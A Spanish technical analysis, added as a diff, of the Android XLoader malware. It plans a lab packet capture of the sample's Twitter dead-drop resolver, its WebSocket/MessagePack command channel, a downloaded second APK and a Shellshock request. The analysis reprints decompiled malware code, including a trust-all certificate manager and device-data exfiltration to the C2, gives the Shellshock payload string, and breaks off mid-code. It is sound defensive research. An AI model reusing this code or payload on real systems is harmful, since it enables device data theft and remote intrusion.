@@ -1,0 +1,855 @@
+XLoader for Android, identificado por MITRE ATT&CK como [S0318](https://attack.mitre.org/software/S0318/), es una familia maliciosa para Android relacionada con campañas dirigidas principalmente contra usuarios asiáticos. La muestra estudiada se presenta como una aplicación pornográfica orientada a Corea del Sur y coincide con la variante descrita por [Trend Micro](https://www.trendmicro.com/en_us/research/19/d/new-version-of-xloader-that-disguises-as-android-apps-and-an-ios-profile-holds-new-links-to-fakespy.html). La muestra ha sido seleccionada por su capacidad de resolver la dirección del C2 a partir de una petición a Twitter y por sus capacidades adicionales asociadas a técnicas detectables en red.
+
+Para la futura captura se selecciona un flujo que cubrirá cinco técnicas con manifestación observable en red:
+
+- **[T1481.001, Dead Drop Resolver](https://attack.mitre.org/techniques/T1481/001/).** La muestra consultará la cuenta regional de Twitter, extraerá de su título la dirección y el puerto del servidor de mando y control (C2) y abrirá después una conexión directa con ese extremo. Twitter almacena el puntero hacia la infraestructura, pero no transporta las órdenes ni las respuestas del C2.
+- **[T1509, Non-Standard Port](https://attack.mitre.org/techniques/T1509/).** El canal directo de mando y control utilizará el puerto `28833`, seleccionado entre los indicadores publicados para la familia.
+- **[T1407, Download New Code at Runtime](https://attack.mitre.org/techniques/T1407/).** La muestra consultará el mapa de paquetes mediante `getPkgMap`, solicitará una APK adicional mediante `getPkgData` y recibirá sus bytes dentro del canal C2.
+- **[T1604, Proxy Through Victim](https://attack.mitre.org/techniques/T1604/).** El C2 enviará una orden `http`; el teléfono realizará la solicitud HTTP hacia el destino indicado y devolverá por el canal C2 el código de estado, las cabeceras y el cuerpo recibidos.
+- **[T1428, Exploitation of Remote Services](https://attack.mitre.org/techniques/T1428/).** La petición originada por el teléfono reproducirá la explotación de [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271), conocida como Shellshock, contra un servicio CGI emulado. La firma maliciosa viajará en la cabecera `User-Agent` y la respuesta controlada representará el resultado de la ejecución del comando.
+
+El protocolo HTTP aparecerá en tres conversaciones: las consultas a Twitter, protegidas mediante HTTPS; la navegación independiente del `WebView`; y la petición dirigida al servicio CGI vulnerable. El canal C2 no utiliza HTTP: después de establecer TCP, o TLS cuando corresponda, intercambia directamente tramas binarias con formato RFC 6455.
+
+El flujo incluirá además la consulta de `fdgoer343`, una segunda cuenta de Twitter cuyo título proporciona una URL que la aplicación abre en su `WebView`. A lo largo del documento se denominará **cuenta del WebView**. Esta conversación reutiliza el mecanismo de extracción y decodificación empleado para localizar el C2, pero no constituye otro Dead Drop Resolver porque su resultado dirige el contenido visible del `WebView` y no permite descubrir la infraestructura de mando y control. El código solo demuestra la carga de una URL controlada remotamente: no permite determinar si el contenido histórico suplantaba una entidad bancaria, mostraba material pornográfico o cumplía otra finalidad. La apariencia pornográfica de la aplicación y el smishing pertenecen a la distribución descrita para la campaña.
+
+Los fragmentos siguientes proceden del código descompilado. Cuando la ofuscación o las colisiones de nombres dificultan su lectura, se normalizan identificadores locales y nombres de métodos auxiliares, pero se conservan las constantes, el orden de operaciones, los tipos y las condiciones que determinan el tráfico.
+
+El análisis se apoya en la APK original y en su exportado de JADX:
+
+| Artefacto estudiado | Identidad | SHA-256 |
+|---|---|---|
+| APK original | Paquete `ufD.wykyx.vlhvh`; etiqueta `SEX kr porn`; versión 1.0.0; API mínima 14 y objetivo 21 | `332e68d865009d627343b89a5744843e3fde4ae870193f36b82980363439a425` |
+
+### División de canales de red
+
+Antes de desarrollar el flujo conviene separar las conversaciones que podrán aparecer en la captura:
+
+| Canal | Uso en la futura captura |
+|---|---|
+| DNS | Resolución de `twitter.com` y de los nombres usados para el contenido del `WebView` y el servicio CGI vulnerable.  |
+| HTTPS hacia Twitter | Recuperación de la dirección y el puerto del C2 mediante `sdfghuio342`, y de la URL del `WebView` mediante `fdgoer343`. |
+| HTTP del `WebView` | Carga independiente de la URL obtenida desde `fdgoer343`. No transporta órdenes del C2. |
+| Canal directo con el C2 | Tramas binarias sobre TCP y, si la cadena comienza por `ssl://`, sobre TLS. Transporta `hello`, las órdenes, la APK adicional y las respuestas. |
+| HTTP hacia el servicio vulnerable | Petición Shellshock originada por el teléfono a partir de la orden `http`; el resultado del servicio CGI vuelve por el canal C2. |
+
+La APK adicional viaja dentro del canal C2, no mediante una descarga HTTP independiente.
+
+#### Dirección del C2 para la futura captura
+
+La dirección del C2 no tiene que conservar el valor observado en la campaña original. Para la futura captura, la respuesta controlada de Twitter codificará `10.0.2.2:<C2_PORT>`. En Android Emulator, `10.0.2.2` es la dirección especial que permite a una aplicación del dispositivo emulado alcanzar un servicio que escucha en `127.0.0.1` en el equipo anfitrión.
+
+El contenido recuperado desde Twitter también puede expresar el C2 mediante un nombre de dominio, en cuyo caso aparecería una resolución DNS antes de la conexión. No obstante, esa alternativa añade una interacción que no resulta necesaria para el escenario propuesto; se utilizará `10.0.2.2` para mantener el flujo mínimo y reproducible.
+
+#### Dos usos independientes de TLS
+
+La muestra puede usar TLS en dos conexiones diferentes: el HTTPS empleado para consultar Twitter y, de forma opcional, el canal directo con el C2. Cada conexión se configura por una ruta de código distinta y no comparte necesariamente las mismas reglas de validación de certificados.
+
+Para el acceso HTTPS a Twitter, el código fija `TLSv1.2` e instala globalmente en `HttpsURLConnection` un `X509TrustManager` cuyas comprobaciones de confianza están vacías. En consecuencia, esta ruta acepta una cadena de certificados no confiable. Sin embargo, no reemplaza el `HostnameVerifier`, que comprueba que el certificado corresponde al nombre solicitado. Para `https://twitter.com/...`, el certificado del servicio emulado debe incluir `DNS:twitter.com` en la extensión `subjectAltName` o SAN. No conviene depender solo del nombre común o CN, cuyo tratamiento varía entre versiones de Android.
+
+```java
+System.setProperty("https.protocols", "TLSv1.2");
+TrustManager[] trustManagers = { new X509TrustManager() {
+    public void checkClientTrusted(X509Certificate[] chain, String authType) {}
+    public void checkServerTrusted(X509Certificate[] chain, String authType) {}
+    public X509Certificate[] getAcceptedIssuers() { return null; }
+}};
+
+SSLContext context = SSLContext.getInstance("TLS");
+context.init(null, trustManagers, new SecureRandom());
+HttpsURLConnection.setDefaultSSLSocketFactory(context.getSocketFactory());
+```
+
+El C2 utiliza otra ruta TLS. Si el texto decodificado comienza por `ssl://`, el programa lo sustituye por `wss://`; la biblioteca crea entonces un `SSLSocket` con `SSLSocketFactory.getDefault()`. No hereda la fábrica permisiva instalada en `HttpsURLConnection`. Por tanto, el certificado del C2 debe encadenar con una autoridad aceptada por el almacén del sistema o incorporarse de forma controlada a ese almacén. La biblioteca no configura verificación de identidad del extremo ni llama a un verificador de nombre para esa conexión directa; la exigencia comprobada es la confianza de la cadena del TLS predeterminado. Si no aparece `ssl://`, se usa `ws://` y no hay TLS.
+
+### Configuraciones
+
+Algunos comportamientos del malware dependen de la configuración regional del dispositivo infectado. El código obtiene este dato mediante `Locale.getDefault()` y busca en su representación textual los identificadores `ko` y `ja`. No se trata de una restricción que impida ejecutar XLoader fuera de Corea del Sur o Japón, sino de una selección regional de determinadas ramas. En el flujo analizado se han comprobado dos efectos: la región determina qué cuenta de Twitter se consulta por defecto para localizar el C2 y, después de establecer el canal, una región que contiene `ko` evita la llamada adicional `openbrowser2`.
+
+#### Selección regional de cuentas
+
+El valor predeterminado de `addr_accounts` es:
+
+`sdfghuio342|asdqweqweqeqw|ukenivor3`
+
+La selección aparece directamente en la rutina que precede a la consulta de Twitter:
+
+```java
+String accounts = preferences.getString(
+    "addr_accounts",
+    "sdfghuio342|asdqweqweqeqw|ukenivor3"
+);
+List values = split(accounts, '|');
+String locale = Locale.getDefault().toString();
+
+if (locale.contains("ko")) {
+    account = preferences.getString("account", (String) values.get(0));
+} else if (locale.contains("ja")) {
+    account = preferences.getString("account", (String) values.get(2));
+} else {
+    account = preferences.getString("account", (String) values.get(1));
+}
+```
+
+Por tanto, la correspondencia es:
+
+| Configuración regional | Índice | Cuenta predeterminada |
+|---|---:|---|
+| Contiene `ko` | 0 | `sdfghuio342` |
+| Contiene `ja` | 2 | `ukenivor3` |
+| Cualquier otra | 1 | `asdqweqweqeqw` |
+
+Así, `ko_KR` conduce a `sdfghuio342` cuando la preferencia `account` no contiene un valor guardado. Para la futura captura no se precargará esa preferencia, por lo que se conservará la selección regional predeterminada. La cuenta `fdgoer343` no participa en esta selección: el método `Loader.web` la consulta siempre como cuenta separada para el `WebView`.
+
+Para concretar la futura captura sin falsificar datos históricos se fijan estos **parámetros controlados**:
+
+- Región del dispositivo: `ko_KR`.
+- Cuenta regional de C2: `sdfghuio342`.
+- Cuenta del `WebView`: `fdgoer343`.
+- Destino C2: `10.0.2.2:28833`, donde `10.0.2.2` permite alcanzar el servidor preparado en el equipo anfitrión y `28833` es una elección compatible con los indicadores publicados, no el valor recuperado históricamente de esa cuenta.
+- URL controlada del `WebView`: `http://webview.lab/`, codificada en la respuesta emulada de `fdgoer343`.
+- Actualización controlada: el C2 anunciará `lab.xloader.secondary` como nombre de la APK adicional. El valor asociado será `*`, que indica que la instalación no sustituye a ninguna aplicación anterior y evita una desinstalación previa.
+- Servicio vulnerable emulado: `http://vuln.lab/cgi-bin/status`, que representa un CGI ejecutado mediante una versión de Bash afectada por CVE-2014-6271.
+- Petición de explotación: método `GET`, cuerpo vacío y cabecera `User-Agent` con el valor `() { :;}; echo; /usr/bin/id`.
+- Resultado controlado: respuesta HTTP 200 cuyo cuerpo contiene `uid=1000(cgi) gid=1000(cgi) groups=1000(cgi)`; el servicio emulado reconocerá la firma, pero no ejecutará comandos reales.
+
+### Arranque y bifurcación de los canales
+
+La actividad principal inicia el servicio, configura el `WebView` y programa, unos 500 ms después, la invocación de `Loader.web(Activity, WebView)` mediante reflexión, es decir, localizando la clase y el método por su nombre durante la ejecución. El servicio invoca `Loader.start(Context, Intent, int[])` una sola vez por instancia. El arranque interactivo abre así dos ramas concurrentes:
+
+```java
+protected void onCreate(Bundle state) {
+    super.onCreate(state);
+    s.s(this);                         // startService(...)
+    setContentView(R.layout.web);
+    new Handler().postDelayed(new WebRunnable(), 500L);
+}
+
+// WebRunnable.run()
+loaderClass.getMethod("web", Activity.class, WebView.class)
+    .invoke(loaderInstance, activity, webView);
+```
+
+- El servicio consulta la cuenta regional para obtener el C2.
+- `Loader.web` crea otro hilo, consulta `fdgoer343`, decodifica la URL resultante y la entrega al `WebView`.
+
+Al comenzar, `Loader.start` incrementa el contador persistente `create`; en una primera ejecución su valor comunicado será 1. También crea la notificación del servicio, mantiene la CPU activa mediante un `PARTIAL_WAKE_LOCK`, crea o limpia el directorio `/.update2/`, inventaría los paquetes instalados, registra los receptores de eventos de Android y da de alta los métodos remotos que podrá invocar el C2, incluido `http`. La limpieza de `/.update2/` elimina cualquier APK que hubiera quedado de una ejecución anterior.
+
+### Estructura general del Dead Drop Resolver
+
+#### Acceso HTTP a Twitter
+
+Para cada cuenta, `Loader.a(String)` inserta el nombre del perfil en la plantilla predeterminada `https://twitter.com/%s`. La solicitud lógica es:
+
+```java
+HttpURLConnection connection =
+    (HttpURLConnection) new URL(url).openConnection();
+
+connection.setConnectTimeout(7000);
+connection.setReadTimeout(15000);
+connection.setRequestMethod("GET");
+connection.setUseCaches(false);
+connection.setInstanceFollowRedirects(true);
+connection.addRequestProperty(
+    "User-Agent",
+    "Mozilla/5.0 (Windows NT 6.3; WOW64) Chrome/41.0.2272.118"
+);
+connection.addRequestProperty("Accept", "text/html,*/*;q=0.8");
+connection.addRequestProperty("Accept-Encoding", "gzip");
+connection.addRequestProperty("Accept-Language", "zh-CN,zh;q=0.8,en;q=0.6");
+connection.addRequestProperty("Cache-Control", "no-cache");
+connection.connect();
+```
+
+Una respuesta con código 2xx se lee por completo. Si `Content-Encoding` es exactamente `gzip`, el cuerpo se descomprime con `GZIPInputStream`. Para otros códigos devuelve una matriz de bytes vacía, salvo en un 3xx, que representa una redirección: en ese caso vuelve a ejecutar la descarga con la URL resultante de `getURL()`. Como el seguimiento automático de redirecciones ya está activado, lo habitual es que `getResponseCode()` corresponda al destino final.
+
+```java
+int responseClass = connection.getResponseCode() / 100;
+if (responseClass != 2) {
+    return responseClass == 3
+        ? download(connection.getURL().toString())
+        : new byte[0];
+}
+
+byte[] body = readAll(connection.getInputStream());
+return "gzip".equals(connection.getHeaderField("Content-Encoding"))
+    ? gunzip(body)
+    : body;
+```
+
+La primera petición de la futura captura tendrá esta forma. El código no establece manualmente la cabecera `Host`: `HttpURLConnection` la genera a partir del nombre incluido en la URL, que en este caso es `twitter.com`. Las demás cabeceras mostradas sí se añaden expresamente mediante `addRequestProperty`.
+
+```http
+GET /sdfghuio342 HTTP/1.1
+Host: twitter.com
+User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) Chrome/41.0.2272.118
+Accept: text/html,*/*;q=0.8
+Accept-Encoding: gzip
+Accept-Language: zh-CN,zh;q=0.8,en;q=0.6
+Cache-Control: no-cache
+```
+
+#### Extracción del título
+
+La respuesta oculta el valor mediante caracteres Han, es decir, los caracteres ideográficos empleados históricamente en la escritura china y reutilizados también en otros sistemas de escritura de Asia oriental. En este documento, CJK se emplea únicamente como abreviatura para esa secuencia de caracteres. El código no interpreta su significado lingüístico: solo acepta puntos de código del intervalo Unicode U+4E00–U+9FA5 y los transforma en números para recuperar el texto oculto.
+
+La expresión regular predeterminada es `<title>abcd([\u4e00-\u9fa5]+?) `. Los paréntesis definen el grupo de captura 1, que será el fragmento entregado al decodificador. `Matcher.find()` busca una coincidencia en cualquier posición del HTML; no exige que el título sea el primer elemento del documento ni que se cierre inmediatamente. El mínimo semántico que debe aparecer en el cuerpo es:
+
+```java
+String pattern = preferences.getString(
+    "addr_pattern",
+    "<title>abcd([\\u4e00-\\u9fa5]+?) "
+);
+Matcher matcher = Pattern.compile(pattern).matcher(html);
+String encoded = null;
+if (matcher.find()) {
+    encoded = matcher.group(1);
+}
+if (encoded != null) {
+    address = com.p.a(encoded);
+}
+```
+
+Por tanto, la construcción mínima buscada es `<title>abcd`, seguida de uno o más caracteres cuyos puntos de código Unicode estén entre U+4E00 y U+9FA5, y finalmente un espacio ASCII.
+
+El literal `abcd` sí aparecerá en el cuerpo HTTP y, por tanto, en el PCAP si se descifra HTTPS. Lo que no forma parte del valor extraído es ese prefijo: el grupo 1 de la expresión regular contiene únicamente la secuencia CJK. El espacio final delimita la coincidencia y tampoco pertenece al grupo. Puede haber HTML antes o después. Para la futura captura, el servicio emulado solo necesitará un documento válido cuyo título contenga esa construcción; no será necesario imitar la página completa de Twitter.
+
+El servidor implementado devuelve el documento mínimo siguiente, donde `<CJK_C2>` representa los caracteres producidos por la operación inversa. La fecha y la longitud dependen del instante de ejecución y de la secuencia CJK concreta:
+
+```http
+HTTP/1.1 200 OK
+Date: <fecha HTTP>
+Content-Type: text/html; charset=utf-8
+Content-Length: <longitud UTF-8 del documento>
+Cache-Control: no-store
+Connection: close
+
+<!doctype html><html><head><meta charset="utf-8"><title>abcd<CJK_C2> </title></head><body></body></html>
+```
+
+#### Decodificación CJK
+
+Los caracteres extraídos aún no representan directamente una dirección legible. La aplicación transforma cada carácter CJK en un carácter de texto claro mediante una resta, un desplazamiento de bits y una operación de OR exclusivo, denominada XOR, con la clave repetida `beg`. Para la posición `i`, la muestra calcula:
+
+```java
+public static String decode(String value) {
+    char[] output = new char[value.length()];
+    int keyIndex = 0;
+    for (int i = 0; i < value.length(); i++) {
+        output[i] = (char) (
+            ((value.charAt(i) - 19968) >> 3)
+            ^ "beg".charAt(keyIndex)
+        );
+        keyIndex = (keyIndex + 1) % 3;
+    }
+    return new String(output);
+}
+```
+
+`P[i] = (((E[i] - 19968) >> 3) XOR K[i mod 3])`
+
+`E[i]` es el carácter CJK capturado, `P[i]` el carácter de texto claro y `K` la clave `beg`. La clave tiene periodo tres: `b`, `e`, `g`, `b`, `e`, `g` y así sucesivamente. El desplazamiento de tres bits descarta el resto inferior del valor CJK.
+
+La inversión necesaria para construir el contenido de la futura captura es:
+
+`E[i] = 19968 + ((P[i] XOR K[i mod 3]) << 3) + r[i]`, con `r[i]` entre 0 y 7.
+
+Los ocho valores posibles de `r[i]` se decodifican igual porque sus tres bits inferiores se eliminan. Para que el PCAP pueda repetirse de forma determinista se elegirá, por ejemplo, `r[i] = 0` en todas las posiciones; será un parámetro controlado de la captura y no un atributo histórico. Cada `E[i]` generado deberá continuar dentro de U+4E00 a U+9FA5, pues cualquier carácter fuera de ese intervalo rompería la captura de la expresión regular.
+
+El valor decodificado determina uno de dos transportes para el C2. Si comienza por `ssl://`, la muestra abre una conexión TCP protegida con TLS. En cualquier otro caso, abre una conexión TCP sin cifrado. No utiliza HTTP en ninguno de los dos casos. Los prefijos internos `wss://` y `ws://` solo sirven para seleccionar una de esas dos opciones en la biblioteca. En la futura captura, `10.0.2.2:28833` se convertirá en `ws://10.0.2.2:28833` y producirá TCP sin TLS. La dirección se guarda en `last_addr` para reutilizarla si falla una consulta posterior a Twitter.
+
+```java
+String decoded = resolve(account);
+if (decoded != null) {
+    String address;
+    if (decoded.startsWith("ssl://")) {
+        address = decoded.replace("ssl://", "wss://");
+    } else {
+        address = "ws://" + decoded;
+    }
+    preferences.edit().putString("last_addr", address).apply();
+    return address;
+}
+
+String previous = preferences.getString("last_addr", "");
+return !previous.isEmpty() ? previous : null;
+```
+
+#### Fallos y reintentos
+
+Si falla la petición HTTP, la extracción mediante la expresión regular o la decodificación, la función devuelve nulo y registra `DNS ERROR`, aunque el problema real no tenga por qué estar en DNS. Primero intenta reutilizar la última dirección guardada en `last_addr`; durante la primera ejecución todavía no dispone de ella. Un planificador vuelve entonces a consultar Twitter hasta obtener un valor: comienza con una espera de 2 s, duplica el intervalo después de cada fallo y lo limita a 600 s. En el sexto fallo intenta enviar por correo un aviso alternativo con el texto `DNS ERROR`.
+
+Los fallos de la conexión C2 se contabilizan por separado. Existe un planificador con hasta diez reintentos, espera inicial aproximada de 1,5 s, multiplicador 1,5, límite de 300 s y dispersión de 0,1; al sexto error general también se intenta el aviso por correo. El cierre elimina las peticiones pendientes y vuelve a iniciar la conexión, incluida una nueva consulta a Twitter. Cierres cuyo motivo comienza por `301:` pueden cambiar la cuenta persistida; `302:` se relaciona con la actualización de configuración.
+
+### Consulta de `fdgoer343` y carga del `WebView`
+
+`Loader.web` ejecuta en un hilo nuevo el mismo `Loader.a(String)`, con `fdgoer343`. Se repiten el HTTPS, las cabeceras, la expresión regular y el algoritmo CJK. La diferencia está en el consumidor: el resultado se entrega directamente a `WebView.loadUrl` en el hilo principal. No se antepone `ws://` ni se sustituye `ssl://`.
+
+```java
+public final void run() {
+    final String url = Loader.this.a("fdgoer343");
+    new Handler(Looper.getMainLooper()).post(new Runnable() {
+        public final void run() {
+            webView.loadUrl(url);
+        }
+    });
+}
+```
+
+La consulta anterior reutiliza exactamente el mismo cliente HTTP. Por tanto, el mensaje tiene la misma forma y solo cambia la ruta:
+
+```http
+GET /fdgoer343 HTTP/1.1
+Host: twitter.com
+User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) Chrome/41.0.2272.118
+Accept: text/html,*/*;q=0.8
+Accept-Encoding: gzip
+Accept-Language: zh-CN,zh;q=0.8,en;q=0.6
+Cache-Control: no-cache
+```
+
+La cadena decodificada debe incluir un esquema navegable completo, normalmente `http://` o `https://`. Para la futura captura se usará el valor controlado `http://webview.lab/`. El `WebView` resolverá `webview.lab` y realizará su propia petición HTTP; sus cabeceras, conexiones auxiliares y solicitudes de recursos dependen de la versión de WebView y del contenido servido, no del cliente usado para Twitter. Esta ruta de código no inspecciona las aplicaciones bancarias instaladas ni selecciona una entidad que deba representarse en la página.
+
+La consecuencia de red mínima, una vez decodificado el título, será:
+
+```text
+Valor entregado a WebView: http://webview.lab/
+Consulta DNS:              A y, según la plataforma, AAAA de webview.lab
+Conexión:                  TCP/80 hacia la dirección respondida
+Petición de aplicación:    GET / con Host webview.lab
+```
+
+Solo el método, la ruta y el nombre pueden exigirse por esta cadena. El resto de cabeceras debe obtenerse de la ejecución real del `WebView` empleado en la futura captura.
+
+### Estructura general del canal C2
+
+Sobre el transporte directo, la clase `com.g` implementa un esquema de llamada y respuesta que el propio código trata como RPC. Cada solicitud contiene un nombre de método, parámetros y un identificador incremental; la respuesta reutiliza ese identificador para completar la llamada pendiente. La serialización concreta se desarrolla después de describir el transporte.
+
+#### Transporte real
+
+La biblioteca de transporte recibe la URI construida a partir del valor de Twitter y un tiempo máximo de 7.000 ms para abrir la conexión. El prefijo `ws://` hace que abra una conexión TCP contra el host y el puerto indicados. El prefijo `wss://` hace que utilice un `SSLSocket`, por lo que primero negocia TLS y después intercambia las cargas de aplicación. Finalmente activa `SO_KEEPALIVE`.
+
+```java
+t socket = new y().a(uri, 7000);
+socket.a(listener);
+peer.a(socket.g());
+peer.a().a(60000L);
+peer.a().f().setKeepAlive(true);
+```
+
+El establecimiento de este canal es directo. En `com.b.a.a.t.q()` se obtienen los flujos de entrada y salida de la conexión, mientras que los dos métodos que deberían escribir una negociación HTTP y validar su respuesta están vacíos. En consecuencia, la ruta y la consulta de la URI solo existen dentro del objeto Java: no se envía una petición `GET`, no aparecen las cabeceras `Upgrade` y `Connection`, y el cliente no espera la respuesta HTTP 101 habitual de WebSocket.
+
+```java
+private Map<String, List<String>> q() throws w {
+    Socket socket = socketConnector.a();
+    aa input = input(socket);
+    ac output = output(socket);
+    String key = randomKey();
+    writeHandshake(output, key);
+    Map<String, List<String>> headers = readHandshake(input, key);
+    this.i = input;
+    this.j = output;
+    return headers;
+}
+
+private void writeHandshake(ac output, String key) {
+    return;
+}
+
+private Map<String, List<String>> readHandshake(aa input, String key) {
+    return new HashMap<>();
+}
+```
+
+Tras establecer TCP, o completar TLS en la variante cifrada, la primera carga de aplicación del canal C2 será una trama binaria con el formato definido por RFC 6455.
+
+El escritor de la biblioteca sí conserva la estructura binaria de las tramas y fuerza el bit de máscara en todas las enviadas por el cliente:
+
+```java
+public void writeFrame(z frame) {
+    write((frame.opcode() & 15)
+        | (frame.fin() ? 128 : 0)
+        | (frame.rsv1() ? 64 : 0)
+        | (frame.rsv2() ? 32 : 0)
+        | (frame.rsv3() ? 16 : 0));
+
+    int length = frame.payloadLength();
+    write(length <= 125 ? length | 128 : length <= 65535 ? 254 : 255);
+    writeExtendedLength(length);
+
+    byte[] mask = randomBytes(4);
+    write(mask);
+    for (int i = 0; i < length; i++) {
+        write((frame.payload()[i] ^ mask[i % 4]) & 255);
+    }
+}
+```
+
+Los campos `FIN`, `opcode`, `MASK`, las longitudes extendidas y la operación XOR con una máscara de cuatro octetos pertenecen a RFC 6455. XLoader utiliza el código de operación 2 para las cargas binarias y, conforme al RFC, enmascara las tramas enviadas por el cliente; el servidor responde sin máscara. El contenido de aplicación transportado en ellas corresponde a los objetos MessagePack descritos a continuación. Si se elige `wss://`, la estructura completa queda protegida por TLS.
+
+La llamada `a(60000L)` configura el emisor periódico de **ping**, no un tiempo de espera de RPC: cada 60.000 ms envía una trama de control con código de operación 9. Su carga útil es el contador decimal ASCII `1`, `2`, `3` y sucesivos. Este latido es distinto de `SO_KEEPALIVE`, cuyo calendario depende del sistema operativo. Un cierre normal usa código 1000; el cierre o error invalida todas las llamadas pendientes y activa la reconexión descrita.
+
+#### MessagePack con semántica JSON-RPC 2.0
+
+Las tramas binarias de datos usan MessagePack en ambos sentidos: el cliente lo emplea para sus solicitudes y notificaciones, y el servidor para las solicitudes que dirige al teléfono y para las respuestas. MessagePack representa mapas, matrices, cadenas, enteros y bloques de bytes de forma compacta. Los mapas siguen la estructura lógica de JSON-RPC 2.0 para identificar el método remoto, sus parámetros y el identificador que relaciona cada petición con su respuesta. No se transmite texto JSON: nombres como `jsonrpc`, `method`, `id`, `params` y `result` son claves de un mapa MessagePack. Las tramas de control, como `ping`, no contienen estos objetos RPC.
+
+Una petición del cliente contiene `jsonrpc: "2.0"`, `method`, un `id` entero incremental y, cuando procede, `params`. Si el argumento ya es una matriz o un mapa, se usa directamente; cualquier otro objeto se envuelve en una matriz de un elemento. Nulo omite `params`. Una notificación del cliente omite `id`.
+
+```java
+requestId++;
+Map request = mapOf(
+    "jsonrpc", "2.0",
+    "method", method,
+    "id", Integer.valueOf(requestId)
+);
+
+if (argument != null) {
+    if (argument instanceof Object[] || argument instanceof Map) {
+        request.put("params", argument);
+    } else {
+        request.put("params", new Object[]{ argument });
+    }
+}
+
+if (send(request)) {
+    pending.put(Integer.valueOf(requestId), emitter);
+}
+```
+
+Antes de escribir la trama, el mapa y todos sus valores se convierten a tipos MessagePack. Los `byte[]` se convierten en valores binarios, no en matrices de enteros ni en Base64:
+
+```java
+Value value = toValue(object);
+ByteArrayOutputStream output = new ByteArrayOutputStream();
+MessagePacker packer = MessagePack.newDefaultPacker(output);
+packer.packValue(value);
+packer.close();
+webSocket.sendBinary(output.toByteArray());
+```
+
+La notación usada a continuación representa el objeto después de desempaquetarlo: `map` es un mapa de claves y valores, `array` una matriz y `bin` un bloque de bytes. No es texto presente literalmente en el flujo.
+
+```text
+map {
+  "jsonrpc": "2.0",
+  "method":  <cadena>,
+  "id":      <entero>,
+  "params":  array [...] | map {...}       // campo omitido si el argumento es nulo
+}
+```
+
+Una petición del servidor contiene `method`, `id` y `params`. El cliente busca el manejador registrado y responde con el mismo `id` y `result`. Si el manejador termina sin valor, `result` es nulo. Un error devuelve `error` con `code`, `message` y `data` opcional; los errores internos de manejador usan `-32603`. A la inversa, una respuesta del servidor a una petición cliente debe contener el `id` y `result` o `error`, y se correlaciona con el emisor pendiente.
+
+```text
+Petición del servidor:
+map {"jsonrpc": "2.0", "method": <cadena>, "id": <entero>, "params": array [...]}
+
+Respuesta correcta:
+map {"jsonrpc": "2.0", "id": <mismo entero>, "result": <valor>}
+
+Respuesta de error:
+map {"jsonrpc": "2.0", "id": <mismo entero>,
+     "error": map {"code": <entero>, "message": <cadena>, "data": <valor opcional>}}
+```
+
+#### Petición `hello` y consultas iniciales
+
+La llamada `hello` comunica la identidad y el estado básico del dispositivo después de abrir el C2. No debe fijarse como la primera trama RPC: otras tareas pueden enviar antes llamadas `state` u otros eventos. En la ejecución del laboratorio validada en el PCAP aparecieron varias llamadas `state` y una llamada `ondbm` antes de `hello`, que recibió `id = 6`. Este orden procede de la concurrencia interna de la muestra y no modifica la estructura de la petición. El código muestra sus doce parámetros y el orden en que se incorporan a la matriz:
+
+```java
+Object[] params = new Object[12];
+params[0]  = deviceId(context);
+params[1]  = Integer.valueOf(72);
+params[2]  = Build.VERSION.RELEASE;
+params[3]  = Build.MODEL + ":" + Build.DISPLAY;
+params[4]  = Boolean.valueOf(rooted);
+params[5]  = Integer.valueOf(preferences.getInt("shut", 0));
+params[6]  = Boolean.valueOf(telephony.getSimState() == 5);
+params[7]  = lineNumber;
+params[8]  = telephonyId;
+params[9]  = join(accountsAndMarkers, "\n");
+params[10] = Long.valueOf(getFirstAppDate());
+params[11] = Integer.valueOf(preferences.getInt("create", 0));
+
+peer.call("hello", params).subscribe(new OnHello(), errorHandler);
+```
+
+La respuesta mínima del C2 es un mapa MessagePack con `jsonrpc: "2.0"`, el mismo `id` y `result: nil`. El valor nulo sigue considerándose una respuesta correcta: completa la petición pendiente y ejecuta el manejador `onHello`.
+
+```text
+Cliente a C2:
+map {"jsonrpc": "2.0", "method": "hello", "id": h,
+     "params": array [p0, p1, p2, p3, p4, p5, p6, p7, p8, p9, p10, p11]}
+
+C2 a cliente:
+map {"jsonrpc": "2.0", "id": h, "result": nil}
+```
+
+La respuesta a `hello` activa el método `onHello`. A partir de ese momento el cliente envía una nueva llamada `state` y las consultas `getSmsKW`, `is_call_rec_enable` e `is_show_fs_float_window`. Estas llamadas se añaden a cualquier notificación que las tareas concurrentes ya hubieran enviado antes de recibir la respuesta a `hello`.
+
+```java
+public void onHello(Object ignored) {
+    sendState();
+    peer.call("getSmsKW", null).subscribe(...);
+    peer.call("is_call_rec_enable", null).subscribe(...);
+    peer.call("is_show_fs_float_window", null).subscribe(...);
+
+    if (Locale.getDefault().toString().contains("ko")) {
+        return;
+    }
+    tryShowWebPage(getGoogleAccount());
+}
+```
+
+1. La llamada `state`, con diez parámetros: operador de red, tipo de red refinado, cadena `MAC,pasarela_en_hexadecimal,SSID`, batería, nivel Wi-Fi de -1 a 9, estado de administrador, necesidad de excluir optimización de batería, pantalla apagada, modo de timbre y disponibilidad de estadísticas de uso.
+2. La llamada `getSmsKW`, sin `params`.
+3. La llamada `is_call_rec_enable`, sin `params`.
+4. La llamada `is_show_fs_float_window`, sin `params`.
+
+Para `ko_KR`, `onHello` retorna después de esas llamadas y no ejecuta `openbrowser2`. El servidor implementado responde, respectivamente, con `nil`, una matriz vacía, `false` y `false`. Los identificadores dependen de las llamadas concurrentes anteriores; por ello, el servidor reutiliza siempre el identificador recibido. La comprobación `getPkgMap` se activa de forma independiente a los cinco segundos.
+
+```text
+map {"jsonrpc": "2.0", "method": "state", "id": s, "params": array [10 valores]}
+map {"jsonrpc": "2.0", "method": "getSmsKW", "id": k}
+map {"jsonrpc": "2.0", "method": "is_call_rec_enable", "id": r}
+map {"jsonrpc": "2.0", "method": "is_show_fs_float_window", "id": f}
+
+Respuestas con el mismo id:
+state -> nil; getSmsKW -> []; is_call_rec_enable -> false;
+is_show_fs_float_window -> false
+```
+
+### Descarga de una APK adicional y T1407
+
+#### Planificación y `getPkgMap`
+
+Cuando la conexión se abre con éxito, `Loader.c()` usa un indicador atómico, es decir, un booleano seguro frente a accesos concurrentes, para programar una sola vez la primera comprobación de paquetes a 5.000 ms. A continuación envía `hello` sin esperar esos cinco segundos. La comprobación queda así programada con independencia de que el servidor haya respondido a `hello`. Después de cada ejecución se programa la siguiente a 500.000 ms, incluso cuando se omite `getPkgMap` porque el diálogo de instalación ya está visible.
+
+```java
+if (!pkgCheckScheduled.get()) {
